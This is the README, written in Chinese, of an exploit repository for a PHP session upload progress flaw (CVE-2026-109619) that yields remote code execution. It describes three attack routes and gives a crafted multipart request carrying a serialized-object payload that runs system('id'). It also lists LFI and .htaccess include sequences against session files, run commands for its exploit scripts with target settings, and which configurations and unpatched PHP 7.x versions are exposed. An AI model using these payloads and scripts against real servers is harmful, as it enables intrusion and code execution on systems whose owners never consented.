# CVE-2026-109619 — PHP Session Upload Progress → RCE

利用 PHP Session Upload Progress 機制的多條攻擊路線達成遠端程式碼執行。

## 三條獨立攻擊路線

| 路線 | 核心原理 | 漏洞數 | 前置條件 | HTTP only |
|------|----------|--------|----------|:---------:|
| **Deserialization Injection** | session key pipe 注入 → 反序列化 → `__wakeup` | 1 | gadget class + memchr bypass | ✓ |
| **OOM + LFI/.htaccess** | OOM 保留 session → include 執行 | 2 | LFI 或 .htaccess + `post_max_size ≥ memory_limit` | ✓ |
| **GDB 記憶體劫持** | UAF → 偽造結構體 → 控制流劫持 | 1 | SSH + GDB + debug symbols | ✗ |

---

## Route 1: Deserialization Injection（純 HTTP 單漏洞 RCE）

`PHP_SESSION_UPLOAD_PROGRESS` 值未經消毒直接拼入 session key。
注入 pipe `|` 劈裂 `php` session serializer 格式，植入任意序列化物件。

```
POST /any.php HTTP/1.1
Cookie: PHPSESSID=<32hex>
Content-Type: multipart/form-data

PHP_SESSION_UPLOAD_PROGRESS = |O:13:"Gadget":1:{s:3:"cmd";s:2:"id";}
file = (any data)

→ session decode → __wakeup() → system("id") → RCE
```

**單一 HTTP 請求、不需要 OOM、不需要 LFI。**

PHP 8.x 的 session encode 有 `memchr` 保護阻擋 key 中的 `|`，需 binary patch 繞過。
PHP 7.x 無此保護。

技術細節 → [deser-inject.md](deser-inject.md)

---

## Route 2: OOM + Include（HTTP 雙漏洞 RCE）

已在兩個完全不同的環境上驗證成功：

| | Target A | Target B |
|---|---|---|
| OS | Ubuntu 24.04 | CentOS 7 |
| PHP | 8.4.26 | 7.4.33 |
| Apache | 2.4.58 | 2.4.6 |
| 協定 | HTTP | HTTPS |
| Session 路徑 | `/var/lib/php/sessions/` | `/var/lib/php/session/` |
| 包含方式 | `.htaccess` auto_prepend_file | LFI (reader.php) |
| 結果 | `uid=33(www-data)` | `uid=48(apache)` |

同一個 OOM 原語，不需要任何記憶體位址、不需要 GDB、不需要 debug symbols，
跨 PHP 7.x / 8.x、跨作業系統皆可觸發。

在 PHP 8.4.27 / 8.3.36 / 8.2.35 修補（2026-10-21），PHP 7.x 無官方修補。

### OOM 漏洞原理

```
攻擊者 ──POST──▶ PHP (multipart + session upload progress)
                  │
                  ├─ filename 中的 PHP 程式碼寫入 session 檔案
                  ├─ POST body 超過 memory_limit → OOM
                  ├─ OOM 阻止 session RSHUTDOWN → 檔案不被清除
                  │
攻擊者 ──GET───▶ 第二個漏洞 include session 檔案 → RCE
```

1. PHP 處理 multipart 上傳時，將 filename 原樣寫入 session 檔案（session upload progress）
2. POST body 超過 `memory_limit` → OOM 發生在 `sapi_activate()` 階段，session RSHUTDOWN 不執行
3. session 檔案保留在磁碟上，PHP parser 遇到 `<?php` 標籤直接執行

OOM 觸發的必要條件：`post_max_size ≥ memory_limit`

| 設定 | OOM |
|------|:---:|
| `post_max_size=8M`, `memory_limit=128M`（PHP 預設） | ✗ |
| `post_max_size=256M`, `memory_limit=128M`（管理員調高） | ✓ |
| `.htaccess` 覆蓋 memory_limit / post_max_size | ✓ |

技術細節（sapi_activate 中斷路徑、session 寫入機制、檔案格式）→ [oom-exploit.md](oom-exploit.md)

---

## Route 3: GDB 記憶體劫持（SSH 單漏洞 RCE）

不依賴第二個漏洞，透過 GDB 在記憶體中偽造結構體劫持控制流。
需 SSH + sudo + GDB + debug symbols。

技術細節 → [gdb-exploit.md](gdb-exploit.md)

---

## 腳本說明

| 腳本 | 路線 | 前置條件 | 說明 |
|------|------|----------|------|
| **`http_rce.py`** | **Deser Injection** | **gadget class + memchr bypass** | **純 HTTP 單漏洞，單一請求 RCE** |
| `php2shell.py` | OOM + LFI | 目標存在 LFI 漏洞 | 純 HTTP 雙漏洞，不需記憶體位址 |
| `test_http.py` | OOM + auto_prepend | `.htaccess` 已放置，`post_max_size ≥ memory_limit` | `.htaccess` 設定 `auto_prepend_file` |
| `test_default_http.py` | OOM + auto_prepend | `.htaccess` 已放置，Apache AllowOverride All | `.htaccess` 覆蓋所有設定，stock php.ini 即可 |
| `test_oom.py` | 僅 OOM 測試 | `post_max_size ≥ memory_limit` | 只驗證 OOM 是否觸發 |
| `test_gdb.py` | GDB 記憶體劫持 | SSH + GDB + debug symbols | 單漏洞，詳見 [gdb-exploit.md](gdb-exploit.md) |
## 使用方式

### Deserialization Injection（純 HTTP 單漏洞）

```bash
python3 http_rce.py "id"
python3 http_rce.py "uname -a; whoami"
```

修改 `http_rce.py` 頂部設定 `TARGET`、`GADGET_CLASS` 等。
技術細節 → [deser-inject.md](deser-inject.md)

### OOM + LFI

```
1. POST multipart → OOM → session 檔案保留（含 PHP code）
2. GET /vuln.php?file=/var/lib/php/session/sess_<SID> → include → RCE
```

```bash
TARGET_HOST=10.0.0.1 TARGET_PORT=443 python3 php2shell.py
```

### OOM + .htaccess auto_prepend_file

```
1. .htaccess 設定 auto_prepend_file 指向 session 檔案（事先放置）
2. POST multipart → OOM → session 檔案保留（含 PHP code）
3. GET /any.php → Apache 自動 prepend session 檔案 → RCE
```

php.ini 已調整（`post_max_size > memory_limit`）：
```bash
TARGET_HOST=10.0.0.1 python3 test_http.py
```

stock php.ini（`.htaccess` 同時覆蓋 memory_limit 和 post_max_size）：
```bash
TARGET_HOST=10.0.0.1 python3 test_default_http.py
```

## 環境變數

| 變數 | 預設值 | 說明 |
|------|--------|------|
| `TARGET_HOST` | `127.0.0.1` | 目標 IP 或主機名稱 |
| `TARGET_PORT` | `80` 或 `443` | HTTP/HTTPS port |
| `SESSION_PATH` | `/var/lib/php/sessions` | Session 檔案目錄 |
| `CMD` | `id` | 要執行的指令 |

Session 路徑因發行版不同：Debian/Ubuntu `/var/lib/php/sessions/`、CentOS/RHEL `/var/lib/php/session/`、fallback `/tmp/`。

## 檔案結構

```
├── http_rce.py              ← Deser Injection → 純 HTTP 單漏洞 RCE ★
├── php2shell.py             ← OOM + LFI → RCE
├── test_http.py             ← OOM + .htaccess → RCE（需調 php.ini）
├── test_default_http.py     ← OOM + .htaccess → RCE（stock php.ini）
├── test_oom.py              ← OOM 觸發測試
├── test_gdb.py              ← GDB 記憶體劫持 → RCE
├── README.md
├── deser-inject.md          ← Deserialization Injection 技術細節
├── oom-exploit.md           ← OOM 技術細節
├── gdb-exploit.md           ← GDB 路線技術細節
```

## 限制

- **Deser Injection**（`http_rce.py`）：PHP 8.x 需 binary patch 繞過 memchr 保護；需要可用的反序列化 gadget class
- **OOM + LFI**（`php2shell.py`）：需要目標存在 LFI 向量
- **OOM + .htaccess**（`test_http.py`, `test_default_http.py`）：需要 `.htaccess` 已在 web root 且 Apache AllowOverride All
- **OOM 路線共通**：PHP 預設設定下無法單獨觸發 OOM，需要 `post_max_size ≥ memory_limit`
- **GDB 版本**：需要 SSH + sudo + debug symbols
